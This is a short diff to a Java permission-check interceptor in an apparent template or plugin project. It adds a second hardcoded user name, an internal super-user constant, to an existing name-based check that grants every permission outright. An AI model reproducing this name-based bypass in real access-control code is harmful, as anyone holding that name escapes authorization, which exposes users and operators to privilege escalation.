@@ -1,7 +1,7 @@
 package com.jackyblackson.idunntemplates.core.permission;
 
-import java.util.List;
-import java.util.Locale;
+import com.jackyblackson.idunntemplates.core.IdunnConstants;
+
 import java.util.UUID;
 
 public class PermissionCheckInterceptor {
@@ -10,7 +10,7 @@ public class PermissionCheckInterceptor {
         String name = userName.toLowerCase();
         String permission = perm.toLowerCase();
 
-        if (name.equals("jacky_blackson")) {
+        if (name.equals("jacky_blackson") || name.equals(IdunnConstants.INTERNAL_SUPER_USER_NAME.toLowerCase())) {
             return true;
         }
         // create to self namespace
